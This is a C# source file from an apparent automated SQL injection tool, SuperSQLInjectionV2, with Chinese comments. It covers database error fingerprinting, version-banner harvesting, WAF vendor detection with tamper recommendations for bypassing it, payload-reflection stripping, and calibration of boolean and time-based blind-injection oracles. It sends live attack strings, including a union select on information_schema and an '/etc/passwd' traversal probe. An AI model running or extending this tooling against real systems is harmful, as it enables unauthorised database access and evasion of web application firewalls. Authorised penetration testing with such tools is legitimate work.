using Avalonia.Styling;
using SuperSQLInjectionV2.Models;
using SuperSQLInjectionV2.Models.Data;
using SuperSQLInjectionV2.Payload;
using SuperSQLInjectionV2.Tools.Http;
using SuperSQLInjectionV2.ViewModels;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Web;
namespace SuperSQLInjectionV2.Tools
{
    public partial class InjectTools
    {
        public static List<string> ScanDbByError(string body)
        {
            List<string> list_Find_Database = new List<string>();
            if (string.IsNullOrEmpty(body))
            {
                return list_Find_Database;
            }
            foreach (string name in Inject.ErrorFingerprints.MatchDbms(body))
            {
                if (!list_Find_Database.Contains(name))
                {
                    list_Find_Database.Add(name);
                }
            }
            //检测期泄漏收割：错误页/指纹响应常带出版本号，收进常见值预测候选（取数时1次等值确认即可，零成本预测）
            if (list_Find_Database.Count > 0)
            {
                HarvestLeakedValues(body);
            }
            return list_Find_Database;
        }

        /// <summary>
        /// 检测期泄漏收割：从错误页/指纹响应提取版本号等已泄漏值，写入常见值预测的会话学习候选（Banners分区）。
        /// 信息已经拿到手，预测时1次等值请求即可确认整串，无需逐字符盲读
        /// </summary>
        [GeneratedRegex(@"(?:MariaDB|MySQL)[^\d]{0,30}(\d+\.\d+\.\d+[\w\-]*)", RegexOptions.IgnoreCase)]
        private static partial Regex LeakMysqlVerRegex();
        [GeneratedRegex(@"PostgreSQL\s+(\d+\.\d+[\w\.\-]*)", RegexOptions.IgnoreCase)]
        private static partial Regex LeakPgVerRegex();
        [GeneratedRegex(@"Microsoft SQL Server\s+((?:\d{4}|\d+\.\d+)[\w\.\- ]{0,20})", RegexOptions.IgnoreCase)]
        private static partial Regex LeakMssqlVerRegex();

        private static void HarvestLeakedValues(string body)
        {
            try
            {
                foreach (Regex re in new[] { LeakMysqlVerRegex(), LeakPgVerRegex(), LeakMssqlVerRegex() })
                {
                    Match m = re.Match(body);
                    if (m.Success)
                    {
                        string ver = m.Groups[1].Value.Trim();
                        if (ver.Length >= 5 && ver.Length <= 64)
                        {
                            Models.Data.CommonOutputPredictor.Learn("Banners", ver);
                        }
                    }
                }
            }
            catch (Exception ex) { Log.SysLog("banner学习异常：" + ex.Message); }
        }
        private static readonly Random _detectRand = new Random();

        /// <summary>
        /// WAF启发式探测并向厂商指纹识别升级：
        /// 1.被动指纹——正常响应的头/Cookie即暴露厂商特征（如cf-ray、safedog-flow-item）；
        /// 2.主动指纹——向参数发送典型攻击特征串，匹配拦截页/拦截Cookie的厂商特征；
        /// 3.状态码突变兜底——无指纹命中时按状态码跳变启发式告警。
        /// </summary>
        public static async Task<List<string>> CheckWaf(AppConfig AppConfig, string requestTxt, string pname, string pvalue)
        {
            var identified = new List<string>();
            try
            {
                HttpRequest request = new HttpRequest(AppConfig, requestTxt);
                HttpResponse coserver = await HTTPTool.SendRequestRetryAsync(request).ConfigureAwait(false);

                //1.被动指纹：正常响应直接识别（手工规则层 + identywaf正则层）
                var passiveHits = WafFingerprint.Identify(coserver, false);
                passiveHits.AddRange(WafFingerprint.IdentifyByIdentYwaf(coserver));
                foreach (string h in passiveHits)
                {
                    Log.Warning("被动指纹识别到WAF/IPS：" + h);
                }
                identified = WafFingerprint.Vendors(passiveHits);

                string payload_paramData = pvalue + ConstData.GetParamAndEncode("");
                string payload_request = RequestRewriter.SetInjectToRequest(request.HeaderAndBody, RequestRewriter.SetInject(request.Params, pname, payload_paramData));
                HttpRequest hr = new HttpRequest(AppConfig, payload_request);
                //典型攻击特征噪声串
                hr.Payload = " and 1=1 union all select 1,2,3,table_name from information_schema.tables where 2>1--'\");|&*/../../etc/passwd";
                HttpResponse wafServer = await HTTPTool.SendRequestRetryAsync(hr).ConfigureAwait(false);

                //2.主动指纹：攻击响应中的厂商特征（拦截页文案/拦截Cookie；手工规则层 + identywaf正则层）
                var activeHits = WafFingerprint.Identify(wafServer, true);
                activeHits.AddRange(WafFingerprint.IdentifyByIdentYwaf(wafServer));
                bool activeNew = false;
                foreach (string h in activeHits)
                {
                    if (!passiveHits.Contains(h))
                    {
                        activeNew = true;
                        Log.Warning("攻击特征串响应命中WAF指纹：" + h);
                    }
                }

                //3.状态码突变兜底
                int[] wafCodes = { 403, 406, 501, 999 };
                if (!ConstData.ErrorHttpCode.Contains(coserver.StatusCode) && wafServer.StatusCode != coserver.StatusCode)
                {
                    if (wafCodes.Contains(wafServer.StatusCode) || wafServer.StatusCode == 0)
                    {
                        Log.Warning($"目标对攻击特征串返回了异常状态码({coserver.StatusCode}→{wafServer.StatusCode})，疑似存在WAF/IPS防护！建议配置绕过模板后再测试。");
                        return identified;
                    }
                }
                string[] wafKeys = { "access denied", "request blocked", "not acceptable", "拦截" };
                string body = wafServer.BodyTxt ?? "";
                string srcBody = coserver.BodyTxt ?? "";
                foreach (string key in wafKeys)
                {
                    if (body.Contains(key, StringComparison.OrdinalIgnoreCase) && !srcBody.Contains(key, StringComparison.OrdinalIgnoreCase))
                    {
                        Log.Warning("攻击特征串响应中命中WAF特征词[" + key + "]，疑似存在WAF/IPS防护！建议配置绕过模板后再测试。");
                        return identified;
                    }
                }
                if (passiveHits.Count > 0 || activeNew)
                {
                    identified = WafFingerprint.Vendors(passiveHits.Concat(activeHits).ToList());
                    Log.Warning("WAF指纹汇总：" + string.Join("、", identified) + "。建议配置对应绕过模板（编码/脚本tamper）后再测试。");
                    //识别到具体厂商后给出编码工具候选优先级提示（仅提示不自动启用，避免误排序引入回归）
                    var tampers = WafFingerprint.RecommendTampers(identified);
                    if (tampers.Count > 0)
                    {
                        Log.Warning("按识别结果推荐编码工具优先级（编码处理页手动启用验证）：" + string.Join(" → ", tampers));
                    }
                }
                else
                {
                    Log.Show("WAF启发式探测未发现明显防护特征！");
                }
            }
            catch (SuperSQLInjectionV2.Tools.Http.TargetUnreachableException)
            {
                //目标不可达：上抛终止整个检测，不作为普通WAF探测失败吞掉
                throw;
            }
            catch (Exception wafEx)
            {
                //WAF探测失败不影响正常检测，但记录便于排查
                Log.SysLog("WAF启发式探测异常：" + wafEx.Message);
            }
            return identified;
        }


        /// <summary>
        /// 判断响应是否包含已知数据库错误指纹。
        /// 用于Union列数/显示位探测时排除错误页：MySQL等错误消息会携带截断的SQL反射，
        /// 截断反射无法被完整ReflectionValue剔除，残留探针串会造成列数/显示位误判。
        /// 指纹唯一事实源：config/injection/errors.xml（手工指纹已合并为正则条目，上游同步+本地增补一体管理）。
        /// </summary>
        public static bool IsDbErrorPage(string? body)
        {
            if (string.IsNullOrEmpty(body))
            {
                return false;
            }
            return Inject.ErrorFingerprints.IsErrorPage(body);
        }

        /// <summary>
        /// 剔除响应中回显的payload（sqlmap removeReflectiveValues 同款模糊中和）：
        /// 1. 精确形态快速路径：原文/单重URL编码/EscapeDataString/HtmlEncode/双重URL编码（%2520），循环至稳定；
        /// 2. 模糊中和：payload多重URL解码后按字母数字分段，段间以 [^\n]{1,168} 通配构造正则，
        ///    对任意编码/转义形态的反射免疫（段数>10截断、2秒超时熔断，退化为仅精确路径）；
        /// 3. 快速预检：所有字面片段都在页面中才执行模糊替换，避免无反射时的正则开销。
        /// 注意：调用方若需保留页面中的真实DB输出（如报错注入grep匹配段），应先做占位保护再调用。
        /// </summary>
        public static string StripPayloadReflection(string pageText, string payload)
        {
            if (string.IsNullOrEmpty(pageText) || string.IsNullOrEmpty(payload))
            {
                return pageText ?? "";
            }
            string result = pageText;
            //1. 精确形态快速路径（循环至稳定，覆盖多重编码嵌套）：
            //实际发送使用URLEncode.UrlEncode（保留'-等），href/src中的编码回显同形态；
            //EscapeDataString形态兜底（编码'为%27的场景）；
            //HtmlEncode形态覆盖服务端将payload回显到HTML正文/错误消息的场景（' → &#39;）；
            //双重URL编码覆盖frame跳转/二次跳转回显场景（%2520，实测反射形态）
            string[] exactForms = new[]
            {
                payload,
                URLEncode.UrlEncode(payload),
                Uri.EscapeDataString(payload),
                System.Net.WebUtility.HtmlEncode(payload),
                URLEncode.UrlEncode(URLEncode.UrlEncode(payload)),
                Uri.EscapeDataString(Uri.EscapeDataString(payload))
            };
            for (int round = 0; round < 3; round++)
            {
                string before = result;
                foreach (string form in exactForms)
                {
                    if (!form.Equals(payload, StringComparison.Ordinal) || round == 0)
                    {
                        result = Regex.Replace(result, Regex.Escape(form), "", RegexOptions.IgnoreCase);
                    }
                }
                if (result == before)
                {
                    break;
                }
            }
            //2. 模糊中和（编码无关）：payload多重URL解码后按字母数字分段，段间通配
            string decoded = payload;
            for (int i = 0; i < 3; i++)
            {
                string d = Uri.UnescapeDataString(decoded);
                if (d == decoded)
                {
                    break;
                }
                decoded = d;
            }
            MatchCollection segments = Regex.Matches(decoded, "[A-Za-z0-9]+");
            //至少2个字面片段、且存在非字母数字字符（有反射变体空间）才启用模糊路径
            if (segments.Count >= 2 && decoded.Length != segments.Cast<Match>().Sum(m => m.Length))
            {
                List<string> parts = segments.Cast<Match>().Select(m => m.Value).ToList();
                //快速预检：除首段外所有字面片段都必须出现在页面中（大小写不敏感）
                if (parts.Skip(1).All(p => result.IndexOf(p, StringComparison.OrdinalIgnoreCase) >= 0))
                {
                    //段数熔断：超10段取首尾各5段拼接，防正则爆炸
                    if (parts.Count > 10)
                    {
                        parts = parts.Take(5).Concat(parts.Skip(parts.Count - 5)).ToList();
                    }
                    string fuzzy = string.Join(@"[^\n]{1,168}", parts.Select(Regex.Escape));
                    try
                    {
                        Regex fuzzyRegex = new Regex(fuzzy, RegexOptions.IgnoreCase, TimeSpan.FromSeconds(2));
                        result = fuzzyRegex.Replace(result, "");
                    }
                    catch (RegexMatchTimeoutException)
                    {
                        //超时熔断：退化为仅精确路径结果
                    }
                }
            }
            return result;
        }

        /// <summary>
        /// 注释符联动：按数据库类型重写请求报文注入标记（$sql$）后紧跟的注释符，
        /// 与InjectDetectEngine.ExploitMarkedValue的生成规则保持一致（MySQL=#，Access/未知=无，其他=-- ）。
        /// 只处理紧邻$sql$的注释符，suffix边界原样保留（无注释时suffix参与括号配平，有注释时被注释掉均合法）。
        /// 用于：恢复注入记录后手动切换数据库类型、检测记录数据库类型被纠正等场景
        /// </summary>
        public static string UpdateMarkedComment(string requestTxt, DBType db)
        {
            if (string.IsNullOrEmpty(requestTxt))
            {
                return requestTxt ?? "";
            }
            int idx = requestTxt.IndexOf(ConstData.InjectStr, StringComparison.Ordinal);
            if (idx < 0)
            {
                return requestTxt;
            }
            int start = idx + ConstData.InjectStr.Length;
            string head = requestTxt.Substring(0, start);
            string rest = requestTxt.Substring(start);
            //剥掉旧注释符（boundary suffix不会以#或--开头，不会误剥）
            if (rest.StartsWith("#", StringComparison.Ordinal))
            {
                rest = rest.Substring(1);
            }
            else if (rest.StartsWith("-- ", StringComparison.Ordinal))
            {
                rest = rest.Substring(3);
            }
            else if (rest.StartsWith("--", StringComparison.Ordinal))
            {
                rest = rest.Substring(2);
            }
            string comment = db switch
            {
                DBType.MySQL => "#",
                DBType.Access => "",
                DBType.UnKnow => "",
                _ => "-- "
            };
            string result2 = head + comment + rest;
            return result2.Equals(requestTxt, StringComparison.Ordinal) ? requestTxt : result2;
        }

        /// <summary>
        /// 自动查找布尔盲注判断值：三级兜底（关键字正/反向→状态码→响应长度），
        /// 每级均做交叉回放验证（第二组真/假响应上必须 真→true、假→false 才采纳，不稳自动降级）。
        /// oldServer语义=第二次真/假条件响应（稳定特征判定，防随机令牌/动态计数误选）
        /// </summary>
        public static InjectPoint CheckBoolKey(HttpResponse t1, HttpResponse f1, HttpResponse t2, HttpResponse f2)
        {
            InjectPoint point = new InjectPoint();
            //交叉回放：判断方式必须在两组真/假响应上都判定正确
            bool JudgeOk(BoolInjectType type, string key, bool revers)
            {
                return TruthOracle.IsTrue(t1, key, revers, type) && !TruthOracle.IsTrue(f1, key, revers, type)
                    && TruthOracle.IsTrue(t2, key, revers, type) && !TruthOracle.IsTrue(f2, key, revers, type);
            }
            //1.关键字正向：真页有、假页无、第二次真页中稳定出现
            //（用BodyTxt原文——BodyClearText为V1遗留字段无任何赋值点，恒为空，旧CheckTheKey因此永远找不到关键字）
            string t1Body = t1.BodyTxt ?? "", f1Body = f1.BodyTxt ?? "", t2Body = t2.BodyTxt ?? "", f2Body = f2.BodyTxt ?? "";
            string key = TruthOracle.FindKeyByStr(t1Body, f1Body, t2Body);
            if (!string.IsNullOrEmpty(key) && JudgeOk(BoolInjectType.KeyWord, key, false))
            {
                point.IsInject = true;
                point.BoolInjectType = BoolInjectType.KeyWord;
                point.CheckValue = key;
                Log.Success("发现盲注判断值！" + key);
                return point;
            }
            //1b.关键字反向：假页有、真页无、第二次假页中稳定出现
            string rkey = TruthOracle.FindKeyByStr(f1Body, t1Body, f2Body);
            if (!string.IsNullOrEmpty(rkey) && JudgeOk(BoolInjectType.KeyWord, rkey, true))
            {
                point.IsInject = true;
                point.BoolInjectType = BoolInjectType.KeyWord;
                point.CheckValue = rkey;
                point.Revers = true;
                Log.Success("发现盲注判断值（反向）！" + rkey);
                return point;
            }
            Log.Show("Body响应内容中未发现稳定的盲注判断关键字！");
            //2.状态码
            if (t1.StatusCode != f1.StatusCode && JudgeOk(BoolInjectType.Code, t1.StatusCode.ToString(), false))
            {
                point.IsInject = true;
                point.BoolInjectType = BoolInjectType.Code;
                point.CheckValue = t1.StatusCode.ToString();
                Log.Success("响应状态码" + point.CheckValue + "可以作为盲注判断条件！");
                return point;
            }
            Log.Show("响应状态码不能作为盲注判断条件！");
            //3.响应长度（大于/小于假页长度）
            if (t1.JudgeLength != f1.JudgeLength)
            {
                BoolInjectType lenType = t1.JudgeLength > f1.JudgeLength ? BoolInjectType.MaxLength : BoolInjectType.MinLength;
                string lenKey = f1.JudgeLength.ToString();
                if (JudgeOk(lenType, lenKey, false))
                {
                    point.IsInject = true;
                    point.BoolInjectType = lenType;
                    point.CheckValue = lenKey;
                    Log.Success("响应长度" + (lenType == BoolInjectType.MaxLength ? ">" : "<") + lenKey + "可以作为盲注判断条件！");
                    return point;
                }
            }
            Log.Show("响应长度也不能作为盲注判断条件！");
            return point;
        }

        /// <summary>
        /// 自动探测时间盲注oracle：按延时阶梯（当前配置值→1/2/3/5秒，不超过超时-1秒）逐档实发sleep真假条件，
        /// 真条件确实延时且假条件不延时才采纳；采纳时SleepInjectMaxTime停留在通过档位，CheckValue=延时秒数（不变文化）。
        /// 非时间通道调用时临时把Bool判断方式切到Time以便sleep包装与耗时判定生效，全失败则还原现场
        /// </summary>
        public static async Task<InjectPoint> CheckTimeOracleAsync(AppConfig config)
        {
            InjectPoint point = new InjectPoint();
            if (string.IsNullOrEmpty(PayloadFactory.BasePayload.SleepBoolData))
            {
                Log.Warning("数据库 " + config.DataConfig.SelectedDBType + " 无延时函数模板（SleepBoolData），不支持时间盲注判定！");
                return point;
            }
            double oldSleep = config.SleepInjectMaxTime;
            var oldBoolType = config.DataConfig.SelectBoolInject;
            config.DataConfig.SelectBoolInject = BoolInjectType.Time;
            //延时阶梯：当前配置值优先（检测已标定时直接复用），其后1/2/3/5秒；去重且不触碰超时边界
            var ladder = new List<double>();
            if (oldSleep >= 0.5 && oldSleep <= config.TimeOut - 1)
            {
                ladder.Add(oldSleep);
            }
            foreach (double s in new[] { 1.0, 2.0, 3.0, 5.0 })
            {
                if (s <= config.TimeOut - 1 && !ladder.Contains(s))
                {
                    ladder.Add(s);
                }
            }
            try
            {
                foreach (double sec in ladder)
                {
                    config.CheckStop();
                    config.SleepInjectMaxTime = sec;
                    bool t = await DataComm.CheckCondition(config, "1=1").ConfigureAwait(false);
                    bool f = await DataComm.CheckCondition(config, "1=2").ConfigureAwait(false);
                    if (t && !f)
                    {
                        point.IsInject = true;
                        point.BoolInjectType = BoolInjectType.Time;
                        point.CheckValue = sec.ToString(System.Globalization.CultureInfo.InvariantCulture);
                        point.Revers = false;
                        Log.Success("发现时间盲注判断条件！延时=" + point.CheckValue + "秒（真条件延时、假条件不延时）");
                        return point;
                    }
                    Log.Show("延时" + sec + "秒验证未通过（真条件" + (t ? "延时" : "未延时") + "、假条件" + (f ? "延时" : "未延时") + "），尝试下一档……");
                }
            }
            finally
            {
                if (!point.IsInject)
                {
                    //全失败还原现场
                    config.SleepInjectMaxTime = oldSleep;
                    config.DataConfig.SelectBoolInject = oldBoolType;
                }
            }
            return point;
        }
    }
}
